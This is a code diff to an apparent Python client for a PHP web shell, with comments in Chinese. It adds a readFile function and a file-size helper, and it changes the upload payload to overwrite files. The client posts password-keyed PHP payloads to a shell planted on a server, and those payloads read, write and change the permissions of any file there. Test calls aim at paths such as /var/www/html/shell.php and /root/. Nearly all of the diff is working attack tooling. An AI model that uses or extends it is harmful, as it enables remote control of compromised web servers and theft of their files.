@@ -103,7 +103,7 @@ def uploadFile(url, password, buffer, filePath):
               '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
               'try{$f=base64_decode($_POST["'+ rd +'"]);$c=$_POST["'+ rc +'"];$c=str_replace("\n","",$c);' \
               '$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));' \
-              'echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
+              'echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
 
     data = {password: payload, rd: b64encode(filePath.encode()), rc: buffer}
     r = requests.post(url, data, timeout=0.8)
@@ -188,6 +188,27 @@ def chmodFile(url, password, file, mode):
     else:
         raise Exception('PassWord Error!')
 
+def readFile(url, password, file):
+    ra, rb, rc = genRandomStr(3)
+    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
+              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
+              'try{$F=base64_decode($_POST["'+ rc +'"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)?filesize($F):' \
+              '4096));@fclose($P);;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
+    data = {password: payload, rc: b64encode(file.encode())}
+    r = requests.post(url, data, timeout=0.8)
+    rt = r.text
+    # 排除404等的测试结果
+    if r.status_code != 200:
+        raise Exception('status_code == '+str(r.status_code))
+    # 是否正确对payload进行响应
+    if  rt[8:].startswith('ERROR://'):
+        raise Exception(rt[8:-8])
+
+    if rt.startswith(ra) and rt.endswith(rb):
+        return rt[8:-8]
+    else:
+        raise Exception('PassWord Error!')
+
 def formatFileSize(bytes, precision):
     for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB']:
         if abs(bytes) < 1024.0:
@@ -195,6 +216,18 @@ def formatFileSize(bytes, precision):
         bytes /= 1024.0
     return '%s %s' % (format(bytes, '.%df' % precision), 'Yi')
 
+#是否超过最大大小
+def maxFileSize(filesize):
+    num, type = filesize.split(' ')
+    if type in ['GB', 'TB', 'PB', 'EB', 'ZB']:
+        return True
+    elif type == 'MB':
+        if float(num) > 10:
+            return True
+        else:
+            return False
+    else:
+        return False
 
 
 if __name__ == '__main__':
@@ -203,6 +236,7 @@ if __name__ == '__main__':
     #print(downloadFile(url, password, '/var/www/html/1.py'))
     #print(uploadFile(url, password, '123', '/var/www/html/1.txt'))
     #print(scanDir(url, password, '/root/'))
-    #print(formatFileSize(102401, 2))
+    print(formatFileSize(102401, 2))
+    print(maxFileSize('100.00 B'))
     #print(renameFile(url, password, '/var/www/html/1', '/var/www/html/2'))
-    print(chmodFile(url, password, '/var/www/html/shell.php', '0111'))
+    #print(readFile(url, password, '/var/www/html/index.html'))
